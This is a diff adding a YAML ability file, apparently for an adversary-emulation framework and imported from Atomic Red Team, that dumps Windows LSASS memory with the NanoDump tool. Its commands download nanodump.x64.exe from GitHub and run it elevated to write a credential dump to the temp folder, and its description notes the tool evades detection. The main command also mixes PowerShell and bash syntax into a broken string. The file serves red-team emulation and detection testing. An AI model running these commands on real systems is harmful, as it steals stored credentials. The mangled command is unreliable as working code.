@@ -1,0 +1,53 @@
+- id: dddd4aca-bbed-46f0-984d-e4c5971c51ea
+  name: Dump LSASS.exe Memory using NanoDump
+  description: 'The NanoDump tool uses syscalls and an invalid dump signature to avoid
+    detection.
+
+
+    https://github.com/helpsystems/nanodump
+
+
+    Upon successful execution, you should find the nanondump.dmp file in the temp
+    directory'
+  tactic: credential-access
+  technique:
+    attack_id: T1003.001
+    name: 'OS Credential Dumping: LSASS Memory'
+  platforms:
+    windows:
+      sh:
+        command: 'if (Test-Path PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe)
+          {exit 0} else {exit 1}; then : ; else [Net.ServicePointManager]::SecurityProtocol
+          = [Net.SecurityProtocolType]::Tls12; New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
+          -ErrorAction Ignore -Force | Out-Null; Invoke-WebRequest "https://github.com/fortra/nanodump/raw/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe"
+          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe"; fi;
+          PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe -w "%temp%\nanodump.dmp"'
+        cleanup: del "%temp%\nanodump.dmp" >nul 2> nul
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - credential-access
+  - t1003.001
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    dependencies:
+    - description: 'NanoDump executable must exist on disk at specified location (PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe)
+
+        '
+      prereq_command: 'if (Test-Path PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe)
+        {exit 0} else {exit 1}
+
+        '
+      get_prereq_command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\n\
+        New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction\
+        \ Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/fortra/nanodump/raw/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe\"\
+        \ -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe\"\
+        \ \n"
+    technique_created: '2020-02-11T18:41:44.783Z'
+    atomic_guid: dddd4aca-bbed-46f0-984d-e4c5971c51ea
+    import_timestamp: '2025-06-24T11:15:06.549364Z'
